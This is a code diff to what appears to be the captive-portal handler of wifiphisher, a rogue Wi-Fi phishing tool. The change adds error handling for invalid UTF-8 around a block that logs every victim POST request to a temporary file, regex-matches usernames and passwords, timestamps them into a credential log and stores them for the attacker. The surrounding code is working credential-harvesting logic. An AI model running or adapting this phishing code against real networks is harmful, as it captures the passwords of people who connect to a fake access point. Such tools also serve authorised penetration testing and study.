@@ -130,27 +130,31 @@ class CaptivePortalHandler(tornado.web.RequestHandler):
         except KeyError:
             return
 
-        # check if this is a valid phishing post request
-        if content_type.startswith(constants.VALID_POST_CONTENT_TYPE):
-            post_data = tornado.escape.url_unescape(self.request.body)
-            # log the data
-            log_file_path = "/tmp/wifiphisher-webserver.tmp"
-            with open(log_file_path, "a+") as log_file:
-                log_file.write("POST request from {0} with {1}\n".format(
-                    self.request.remote_ip, post_data))
-                # record the post requests in the logging file
-                logger.info("POST request from %s with %s",
-                            self.request.remote_ip, post_data)
-            if re.search(constants.REGEX_PWD, post_data, re.IGNORECASE) or \
-               re.search(constants.REGEX_UNAME, post_data, re.IGNORECASE):
-                if credential_log_path:
-                    with open(credential_log_path, 'a+') as credential_log:
-                        credential_log.write("{} {}".format(
-                            time.strftime(constants.CREDENTIALS_DATETIME_FORMAT),
-                            "POST request from {0} with {1}\n".format(
-                                self.request.remote_ip, post_data)))
-                creds.append(post_data)
-                terminate = True
+        try:
+            # Check if this is a valid POST request
+            if content_type.startswith(constants.VALID_POST_CONTENT_TYPE):
+                post_data = tornado.escape.url_unescape(self.request.body)
+                # log the data
+                log_file_path = "/tmp/wifiphisher-webserver.tmp"
+                with open(log_file_path, "a+") as log_file:
+                    log_file.write("POST request from {0} with {1}\n".format(
+                        self.request.remote_ip, post_data))
+                    # record the post requests in the logging file
+                    logger.info("POST request from %s with %s",
+                                self.request.remote_ip, post_data)
+                if re.search(constants.REGEX_PWD, post_data, re.IGNORECASE) or \
+                   re.search(constants.REGEX_UNAME, post_data, re.IGNORECASE):
+                    if credential_log_path:
+                        with open(credential_log_path, 'a+') as credential_log:
+                            credential_log.write("{} {}".format(
+                                time.strftime(constants.CREDENTIALS_DATETIME_FORMAT),
+                                "POST request from {0} with {1}\n".format(
+                                    self.request.remote_ip, post_data)))
+                    creds.append(post_data)
+                    terminate = True
+        # Invalid UTF-8, drop it.
+        except UnicodeDecodeError:
+            pass
 
         requested_file = self.request.path[1:]
         template_directory = template.get_path()
